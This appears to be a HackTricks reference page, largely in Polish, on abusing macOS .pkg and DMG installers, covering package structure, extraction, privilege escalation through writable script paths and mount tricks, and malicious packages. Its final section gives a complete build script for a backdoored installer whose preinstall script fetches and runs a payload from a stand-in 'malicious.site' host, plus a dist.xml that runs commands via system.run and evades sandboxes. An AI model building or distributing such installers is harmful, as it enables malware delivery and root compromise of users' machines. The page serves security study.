# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Podstawowe Informacje

Pakiet **instalacyjny macOS** (znany również jako plik `.pkg`) to format pliku używany przez macOS do **dystrybucji oprogramowania**. Te pliki są jak **pudełko, które zawiera wszystko, co potrzebne do poprawnej instalacji i uruchomienia oprogramowania**.

Sam plik pakietu jest archiwum, które zawiera **hierarchię plików i katalogów, które będą instalowane na docelowym** komputerze. Może również zawierać **skrypty** do wykonywania zadań przed i po instalacji, takie jak konfigurowanie plików konfiguracyjnych lub usuwanie starych wersji oprogramowania.

### Hierarchia

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Dostosowania (tytuł, tekst powitalny…) oraz kontrole skryptów/instalacji
- **PackageInfo (xml)**: Informacje, wymagania instalacyjne, lokalizacja instalacji, ścieżki do skryptów do uruchomienia
- **Bill of materials (bom)**: Lista plików do zainstalowania, zaktualizowania lub usunięcia z uprawnieniami do plików
- **Payload (archiwum CPIO skompresowane gzip)**: Pliki do zainstalowania w `install-location` z PackageInfo
- **Scripts (archiwum CPIO skompresowane gzip)**: Skrypty przed i po instalacji oraz inne zasoby wyodrębnione do katalogu tymczasowego do wykonania.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Aby zobaczyć zawartość instalatora bez ręcznego dekompresowania, możesz również użyć darmowego narzędzia [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## Podstawowe informacje o DMG

Pliki DMG, czyli obrazy dysków Apple, to format plików używany przez macOS firmy Apple do obrazów dysków. Plik DMG to w zasadzie **montowalny obraz dysku** (zawiera własny system plików), który zawiera surowe dane blokowe, zazwyczaj skompresowane, a czasami zaszyfrowane. Gdy otwierasz plik DMG, macOS **montuje go tak, jakby był fizycznym dyskiem**, co pozwala na dostęp do jego zawartości.

> [!CAUTION]
> Zauważ, że instalatory **`.dmg`** obsługują **tak wiele formatów**, że w przeszłości niektóre z nich zawierające luki były wykorzystywane do uzyskania **wykonania kodu jądra**.

### Hierarchia

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hierarchia pliku DMG może być różna w zależności od zawartości. Jednak w przypadku DMG aplikacji zazwyczaj ma tę strukturę:

- Poziom główny: To jest korzeń obrazu dysku. Często zawiera aplikację i być może link do folderu Aplikacje.
- Aplikacja (.app): To jest właściwa aplikacja. W macOS aplikacja to zazwyczaj pakiet, który zawiera wiele pojedynczych plików i folderów, które tworzą aplikację.
- Link do Aplikacji: To jest skrót do folderu Aplikacje w macOS. Celem tego jest ułatwienie instalacji aplikacji. Możesz przeciągnąć plik .app do tego skrótu, aby zainstalować aplikację.

## Privesc poprzez nadużycie pkg

### Wykonanie z publicznych katalogów

Jeśli skrypt przed lub po instalacji na przykład wykonuje się z **`/var/tmp/Installerutil`**, a atakujący mógłby kontrolować ten skrypt, mógłby eskalować uprawnienia za każdym razem, gdy jest on wykonywany. Lub inny podobny przykład:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

To jest [publiczna funkcja](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), którą kilka instalatorów i aktualizatorów wywoła, aby **wykonać coś jako root**. Ta funkcja akceptuje **ścieżkę** do **pliku**, który ma być **wykonany** jako parametr, jednak jeśli atakujący mógłby **zmodyfikować** ten plik, będzie w stanie **nadużyć** jego wykonania z uprawnieniami roota, aby **eskalować uprawnienia**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Wykonanie przez montowanie

Jeśli instalator zapisuje do `/tmp/fixedname/bla/bla`, możliwe jest **utworzenie montażu** nad `/tmp/fixedname` bez właścicieli, aby móc **zmodyfikować dowolny plik podczas instalacji**, aby nadużyć procesu instalacji.

Przykładem tego jest **CVE-2021-26089**, które udało się **nadpisać okresowy skrypt**, aby uzyskać wykonanie jako root. Aby uzyskać więcej informacji, zapoznaj się z wykładem: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg jako złośliwe oprogramowanie

### Pusty ładunek

Możliwe jest po prostu wygenerowanie pliku **`.pkg`** z **skryptami przed i po instalacji** bez żadnego rzeczywistego ładunku poza złośliwym oprogramowaniem w skryptach.

### JS w pliku xml dystrybucji

Możliwe jest dodanie tagów **`<script>`** w pliku **xml dystrybucji** pakietu, a ten kod zostanie wykonany i może **wykonywać polecenia** za pomocą **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

### Instalator z tylnym wejściem

Złośliwy instalator używający skryptu i kodu JS wewnątrz dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Odniesienia

- [**DEF CON 27 - Rozpakowywanie pakietów: spojrzenie na pakiety instalacyjne macOS i powszechne luki w zabezpieczeniach**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "Dzikie Światło instalatorów macOS" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Rozpakowywanie pakietów: spojrzenie na pakiety instalacyjne macOS**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)

{{#include ../../../banners/hacktricks-training.md}}
